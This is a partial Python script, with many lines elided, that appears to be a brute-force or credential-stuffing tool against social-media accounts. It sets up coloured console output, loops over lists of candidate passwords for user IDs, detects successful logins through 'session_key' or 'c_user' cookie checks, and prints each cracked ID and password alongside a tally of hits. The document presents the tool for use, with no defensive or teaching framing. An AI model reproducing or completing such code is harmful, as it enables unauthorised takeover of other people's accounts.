...
#━━━━━━━━[ COLOUR,UA&LOGO ]━━━━━━━━#
a=("\x1b[38;5;46m");b="\x1b[38;5;47m";c="\x1b[38;5;48m";d="\x1b[38;5;49m";e="\x1b[38;5;50m";w="\x1b[38;5;244m";wx="\x1b[38;5;217m";f=f"\x1b[38;5;217m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";g=f"{w}{f}";h=f"{w}[\x1b[38;5;217m✲{w}]{a}";h1=f"{w}{w}[{wx}1{w}]{a}";h2=f"{w}{w}[{wx}2{w}]{a}";h3=f"{w}{w}[{wx}3{w}]{a}";h4=f"{w}{w}[{wx}4{w}]{a}";h0=f"{w}{w}[{wx}0{w}]{a}";I=f"{a}-{w}➤{a}";I2=f"\x1b[38;5;217m:\x1b[38;5;51m"
...
def firex(ids,names,pasx,tl):
        ...
        kkkiii=str(len(oks))
        sys.stdout.write(f"\r\r{w}[{a}FINDING{w}]\x1b[0m-{w}[\x1b[38;5;39m{loop}{w}]\x1b[0m-{w}[{a}OK:{kkkiii}{w}]\x1b[0m-{w}[\x1b[38;5;39m{percentage}%{w}] ");sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
             ln = names.split(' ')[1]
        except:
        ...
        try:
             for pak in pasx:
                    ...
                    if 'session_key' in po:
                           ...
                           print(f"\r\r{w}[{a}SHISHIR-💙{w}] {a}{uid} {I} {pwx}")
...
def idpaslogin(uid,passlist,tl):
        global loop,oks
        sys.stdout.write(f"\r\r{w}[{a}SHISHIR-XD{w}]{a}-{w}[{a}{loop}{w}|{a}{tl}{w}]{a}-{w}[{a}OK:{str(len(oks))}{w}] ");sys.stdout.flush()
        try:
            for ps in passlist:
                    ...
                    if 'c_user' in log_cookies:
                           ...
                           if 'Photoshop' in res:
                                 print(f"\r\r{w}[{a}SHISHIR-💙{w}] {a}{uid} {I} {ps}")
